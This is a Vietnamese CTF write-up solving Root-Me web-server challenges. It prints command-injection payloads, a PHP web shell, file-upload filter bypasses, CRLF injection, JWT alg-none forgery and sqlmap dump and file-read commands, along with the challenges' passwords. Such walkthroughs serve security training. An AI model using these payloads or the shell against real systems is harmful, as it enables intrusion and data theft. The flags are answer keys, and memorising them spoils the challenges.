# WEB_SERVER
## 1. HTML - Code source
- Bài này thì y như tên gọi chỉ cần bật source code lên xem là được.    
![Screenshot 2022-04-12 172316](https://i.imgur.com/4xdk2Mt.png)
## 2. HTTP - Contournement de filtrage IP
- Bài này yêu cầu truy cập vào mạng nội bộ bằng địa chỉ ip riêng khi kết nối vào mạng nội bộ của công ty.
- Ở đây dùng http header để kết nối vào
```
X-Forwarded-For: 192.168.0.1
``` 
![Screenshot 2022-04-12 173840](https://i.imgur.com/DrYXKX8.png)
- Send và mật khẩu được trả về thành công
```
Well done, the validation password is: Ip_$po0Fing 
```

## 3. HTTP - Open redirect
- Theo như tên đề bài thì ta cần phải chuyển hướng tới 1 trang web nào đó cụ thể là https://google.com
![Screenshot 2022-04-12 174216](https://i.imgur.com/E8Ybhmt.png)
- Nhìn thấy thẻ a thì có truyền vào tham số h, để ý kĩ thì có 32 kí tự chắc là tên miền được mã hóa md5. Encode thì đúng. Vậy chỉ cần encode https://google.com là ra kết quả.
![Screenshot 2022-04-12 174555](https://i.imgur.com/uxQwvDs.png)
![Screenshot 2022-04-12 174611](https://i.imgur.com/20rZJYo.png)

## 4. HTTP - User-agent
- Thì bài này ngay khi truy cập đã nhận được tin này
```
Wrong user-agent: you are not the "admin" browser!
```
- Rất dễ thấy user-agent là thông tin về browser của mình chỉ cần cho nó là admin thì thành công.
![Screenshot 2022-04-12 175110](https://i.imgur.com/P1wrFCz.png)
![Screenshot 2022-04-12 175122](https://i.imgur.com/8O6J1ZK.png)

## 5. Weak password
- Theo như đúng tên đề bài thì bài này nói về mật khẩu rất yếu thì cứ admin, admin ai ngờ thành công
```
pass = admin
```
## 6. PHP - Injection de commande
- Lời gợi ý thì mật khẩu nằm trong file index.php. Nên chắc phải mở được file đó ra xem.
- Trang web cho mình một form input với gợi ý là địa chỉ local. Nhập thì thấy có vẻ input gọi hàm shell_exec(ping).
![Screenshot 2022-04-12 180112](https://i.imgur.com/HmVSxxO.png)
- Vì hàm shell_exec() là hàm dễ bị khai thác nên có thể tìm kiếm, đọc file.
- Đầu tiên thì liệt kê danh sách các file ra xem thì có file index.php sau đó đọc file. 
```
payload = 127.0.0.1; ls 
payload = 127.0.0.1; cat index.php
```
- Ta tìm được source code 
```php
<?php 
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
- Thì flag nằm trong file .passwd chỉ cần đọc file đó lên là thành công.
payload: 127.0.0.1; cat .passwd
```
![Screenshot 2022-04-12 180948](https://i.imgur.com/xLNP8x9.png)

## 7. Backup file
- Đề bài yêu cầu cần tìm được file backup và thử thì tồn tại file index.php.
- Thường thì extension file backup sẽ là  .BAK, .TMP, .GHO , ~
- Thử lần lượt thì ~ là chuẩn và đã tải được file index.php về.
- Bây giờ chỉ cần mở lên rồi đọc password là thành công

```php
$username="ch11";
$password="OCCY9AcNm1tj";


echo '
      <html>
      <body>
	<h1>Authentication v 0.00</h1>
';

if ($_POST["username"]!="" && $_POST["password"]!=""){
    if ($_POST["username"]==$user && $_POST["password"]==$password)
    {
      print("<h2>Welcome back {$row['username']} !</h2>");
      print("<h3>Your informations :</h3><p>- username : $row[username]</p><br />");
      print("To validate the challenge use this password</b>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");

    }
}

echo '
	<form action="" method="post">
	  Login&nbsp;<br/>
	  <input type="text" name="username" /><br/><br/>
	  Password&nbsp;<br/>
	  <input type="password" name="password" /><br/><br/>
	  <br/><br/>
	  <input type="submit" value="connect" /><br/><br/>
	</form>
      </body>
      </html>
';

?> 

```
## 8. HTTP - Directory indexing
- Xem source code thì thấy có directory 
```
<!-- include("admin/pass.html") -->
```
- Vô path admin rồi đọc file admin là có password
```js
Password: Linux
```

## 9. HTTP - Headers
- Bài này về HTTP headers vô phần network xem request thì thấy phần response có phần Header-RootMe-Admin: none mà phần request không có.
- Thêm trường Header-RootMe-Admin: none vô request là có password
![Screenshot 2022-05-13 092627](https://i.imgur.com/5lEpJ2S.png)
![Screenshot 2022-05-13 092647](https://i.imgur.com/wAdanDO.png)
```js
Password: HeadersMayBeUseful 
```
## 10. HTTP - Headers
- Bài này chỉnh sửa về post, thì vô phần network và click thì có request post với scores không đủ để win game. Sửa scores rồi post lại là có password
![Screenshot 2022-05-13 093131](https://i.imgur.com/R2pxii4.png)  

![Screenshot 2022-05-13 093203](https://i.imgur.com/HlVhRMj.png)

![Screenshot 2022-05-13 093221](https://i.imgur.com/hk6AGUF.png)

```js
Password: H7tp_h4s_N0_s3Cr37S_F0r_y0U 
```
## 11. HTTP - Invalid redirect
- Đề gợi ý là chuyển hướng tới file index.php bật burpsuite và bắt request đổi hướng là có password
![Screenshot 2022-05-13 094054](https://i.imgur.com/ksqV8F8.png)
```js
Password: ExecutionAfterRedirectIsBad
```

## 12. HTTP - Verb tampering
- Bài này yêu cầu cần thay đổi phương thức request thì chỉ cần thử lần lượt GET, POST, PUT,...
![Screenshot 2022-05-13 095036](https://i.imgur.com/9huW9UI.png)
- Ở đây thử PUT và đã thành công
```js
Password: a23e$dme96d3saez$$prap
```

## 13. Install files
- Bài này guessing một chút vô soure thì có path dẫn /phpbb và xem tiêu đề bài thì vô /phpbb/install rồi đọc file php ra password
![Screenshot 2022-05-13 095553](https://i.imgur.com/FvHNWFW.png)

```js
Password: karambar
```
## 14. CRLF
- CRLF là viết tắt của Carriage Return và Line Feed, CR và LF là các ký tự điều khiển, được mã hóa tương ứng 0x0D (13 trong hệ thập phân) và 0x0A (10 trong hệ thập phân)
- CRLF Injection là một lỗ hổng có thể xảy ra khi người lập trình không kiểm tra kĩ càng dữ liệu người dùng đẩy lên và cho phép người dùng chèn cả các kí tự CR và LF này vào.
- Bài này cần bypass được log là cần hiển thị được trường admin "authenticated." nhưng khi điền thì tất cả input đề false nên cần inject CRLF để tạo dòng mới.
- Payload url
```js
http://challenge01.root-me.org/web-serveur/ch14/?username=admin%20authenticated.%0D%0Aa&password=admin
```
```js
Password: rFSP&G0p&5uAg1%
```
## 15. File upload - Double extensions
- Bài này lỗ hổng về file upload. Tạo một file php chứa mã độc thực hiện lệnh systerm.
```php
<?php
    if(isset($_GET['c'])){
        $shell = system($_GET['c']);
        echo $shell;
    }
?>
```
- Vì phần upload hạn chế đuôi .php nên chuyển thành .php.jpg là bypass.
- Up lên và thực hiện lệnh thôi. Password nằm ở đây
```js
test.php.jpg?c=cat ../../../.passwd
```

```js
Password: Gg9LRz-hWSxqqUKd77-_q-6G8
```
## 16. File upload - MIME type
- Bài này làm giống như bài trên nhưng bị từ chối không thực thi lệnh php ở jpg nên cần upload thẳng file php lên.
- Nhưng khi đó cần phải thay đổi trường MINE type sang image/png để có thể upload được lên.
- Sửa trường Content-type: image/png là up được php lên
![Screenshot 2022-05-13 104630](https://i.imgur.com/xJvoHXF.png)
- Bây giờ đọc file .passwd là thành công.
![Screenshot 2022-05-13 104714](https://i.imgur.com/wKyiFPr.png)

```js
Password: a7n4nizpgQgnPERy89uanf6T4
```

## 17. HTTP - Cookies
- Ban đầu cho một input thì nhập admin vào nhưng nhập gì cũng chỉ là user bình thường.
- Vô phần request xem thì mặc định cookie là user nên chỉ cần thay đổi thành admin là thành công
![Screenshot 2022-05-13 104929](https://i.imgur.com/JHwAFiG.png)
![Screenshot 2022-05-13 105200](https://i.imgur.com/CTD3ekr.png)
![Screenshot 2022-05-13 105225](https://i.imgur.com/THOInJj.png)

```js
Password: ml-SYMPA 
```
## 18. Insecure Code Management
- Bài này về quản lý code không an toàn nên nói về quản lý code thì phải có file .git
- Tải file về rồi check file git lên là có pass
```js
commit c0b4661c888bd1ca0f12a3c080e4d2597382277b (HEAD -> master)
Author: John <john@bs-corp.com>
Date:   Fri Sep 27 20:10:05 2019 +0200

    blue team want sha256!!!!!!!!!

diff --git a/config.php b/config.php
index e11aad2..663fe35 100644
--- a/config.php
+++ b/config.php
@@ -1,3 +1,3 @@
 <?php
        $username = "admin";
-       $password = "s3cureP@ssw0rd";
+       $password = "0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c";
diff --git a/index.php b/index.php
index f7237d0..2e620c1 100755
--- a/index.php
+++ b/index.php
@@ -13,7 +13,7 @@
                <?php
                        include('./config.php');
                        if(isset($_POST['username']) && isset($_POST['password'])){
-                               if ($_POST['username'] == $username && md5($_POST['password']) == md5($password)){
+                               if ($_POST['username'] == $username && hash('sha256', $_POST['password']) == $password){
                                        echo "<p id='left'>Welcome  ".htmlentities($_POST['username'])."</p>";
                                        echo '<input type="submit" value="LOG IN" href="./index.php" class="button" />';
                                }
```
```js
Password: s3cureP@ssw0rd
```

## 20. JSON Web Token (JWT) - Introduction
- Bài này có trường đăng nhập bằng guess và cấp cho cookie là jwt.
- Phân tích thì nhận được
![Screenshot 2022-05-13 113113](https://i.imgur.com/UsBdH49.png)
![Screenshot 2022-05-13 113245](https://i.imgur.com/3kgP5h7.png)
- Chuyển username thành admin và không cần chế độ mã hóa alg là none rồi đổi cookie lại là xong
```js
{
  "typ": "JWT",
  "alg": "none"
}
{
  "username": "guest"
}

ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0=
ewogICJ1c2VybmFtZSI6ICJndWVzdCIKfQ==
=> Cookie: jwt= ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.ewogICJ1c2VybmFtZSI6ICJndWVzdCIKfQ==

```
![Screenshot 2022-05-13 113700](https://i.imgur.com/2kZiDUr.png)
```js
Password: S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7
```



## 63. File - Reading
- Đầu tiên chương trình cho một form đăng nhập nhưng chỉ cần chú ý đến members vì chứa câu query tại đó
![Screenshot 2022-04-12 154239](https://i.imgur.com/3ivjrwb.png)
- Dùng sql map để dò database thì ta tìm được 3 databases một db thông tin và db test không có gì cả.
```py
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --dbs
...
available databases [3]:                                                                                               
[*] c_webserveur_31
[*] information_schema
[*] test

```
- Tiếp đó là đi tìm từng table trong db c_webserveur_31 tìm được một table member
```py
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" -D c_webserveur_31 --tables
...
Database: c_webserveur_31
[1 table]
+--------+
| member |
+--------+
```
- Dump vào bảng member để xem thông tin thành viên
```py
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" -D c_webserveur_31 -T member --dump
...
Database: c_webserveur_31
Table: member
[1 entry]
+-----------+-------------------------------+--------------+----------------------------------------------------------+
| member_id | member_email                  | member_login | member_password                                          |
+-----------+-------------------------------+--------------+----------------------------------------------------------+
| 1         | admin@super-secure-webapp.org | admin        | VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA== |
+-----------+-------------------------------+--------------+----------------------------------------------------------+
```
- Như vậy là đã có password của member admin nhập thử vào form nhưng bị báo là sai pass. Có một điều đặc biệt là pass có '==' ở cuối đoán là base64 và thử decode rồi điền vào form nhưng vẫn sai pass.
- Lúc này nhìn lên đề bài thì thấy yêu cầu là đọc file thì có lẽ pass sẽ được mã hóa theo một cách nào đó được viết ở trong source code.
- Đọc file source về máy thường thì file tên là index.php hoặc index.html tìm lần lượt thì có vẻ source code là index.php.
```py
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --file-read /challenge/web-serveur/ch31/index.php 
...
[04:19:59] [INFO] the local file '/home/kali/.local/share/sqlmap/output/challenge01.root-me.org/files/_challenge_web-serveur_ch31_index.php' and the remote file '/challenge/web-serveur/ch31/index.php' have the same size (3359 B)            
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/challenge01.root-me.org/files/_challenge_web-serveur_ch31_index.php (same file)

``` 
- Và đây là source code 
```php
<html>
<header><title>SQL injection - FILE</title></header>
<body>
<h3><a href="?action=login">Authentication</a>&nbsp;|&nbsp;<a href="?action=members">Members</a></h3><hr />

<?php

define('SQL_HOST',      '/var/run/mysqld/mysqld3-web-serveur-ch31.sock');
define('SQL_DB',        'c_webserveur_31');
define('SQL_LOGIN',     'c_webserveur_31');
define('SQL_P',         'dOJLsrbyas3ZdrNqnhx');

function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}

$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
 
$GLOBALS["___mysqli_ston"] = mysqli_connect('', SQL_LOGIN, SQL_P, "", 0, SQL_HOST) or exit('mysql connection error !');
mysqli_select_db($GLOBALS["___mysqli_ston"], SQL_DB) or die("Database selection error !");

if($_GET['action'] == "login"){
        print '<form METHOD="POST">
                <p><label style="display:inline-block;width:100px;">Login : </label><input type="text" name="username" /></p>
                <p><label style="display:inline-block;width:100px;">Password : </label><input type="password" name="password" /></p>
                <p><input value=submit type=submit /></p>
                </form>';

        if(isset($_POST['username'], $_POST['password']) && !empty($_POST['username']) && !empty($_POST['password']))
        {
                $user = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], strtolower($_POST['username']));
                $pass = sha1($_POST['password']);
                
                $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT member_password FROM member WHERE member_login='".$user."'");
                if(mysqli_num_rows($result) == 1)
                {
                        $data = mysqli_fetch_array($result);
                        if($pass == stringxor($key, base64_decode($data['member_password']))){
                                // authentication success
                                print "<p>Authentication success !!</p>";
                                if ($user == "admin")
                                    print "<p>Yeah !!! You're admin ! Use this password to complete this challenge.</p>";
                                else 
                                    print "<p>But... you're not admin !</p>";
                        }
                        else{
                                // authentication failed
                                print "<p>Authentication failed !</p>";
                        }
                }
                else{
                        print "<p>User not found !</p>";
                }
        }
}
)

if($_GET['action'] == "members"){
        if(isset($_GET['id']) && !empty($_GET['id']))
        {
                // secure ID variable
                $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_GET['id']);
                $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member WHERE member_id=$id") or die(mysqli_error($GLOBALS["___mysqli_ston"]));
                
                if(mysqli_num_rows($result) == 1)
                {
                        $data = mysqli_fetch_array($result);
                        print "ID : ".$data["member_id"]."<br />";
                        print "Username : ".$data["member_login"]."<br />";
                        print "Email : ".$data["member_email"]."<br />";        
                }
                else{
                        print "no result found";
                }
        }
        else{
                $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member");
                while ($row = mysqli_fetch_assoc($result)) {
                        print "<p><a href=\"?action=members&id=".$row['member_id']."\">".$row['member_login']."</a></p>";
                }
        }
}

?>
</body>
</html>
```
- Ta chỉ cần để ý 2 hàm này
```php
function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}

$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
if($pass == stringxor($key, base64_decode($data['member_password'])))
```
- Có vẻ pass là xor từng bytes giữa member_password và $key
- Viết chương trình đơn giản để lấy pass
```php
<?php
$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i])); 
    return $res;
}
$q = stringxor($key, base64_decode("VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA=="));
echo $q;
?>

$ php test.php
77be4fc97f77f5f48308942bb6e32aacabed9cef 
```
- Và pass kia là mã hóa dạng sha1 nên decrypt là ra mật khẩu rồi submit là thành công.

![Screenshot 2022-04-12 161635](https://i.imgur.com/p7PfLyu.png)
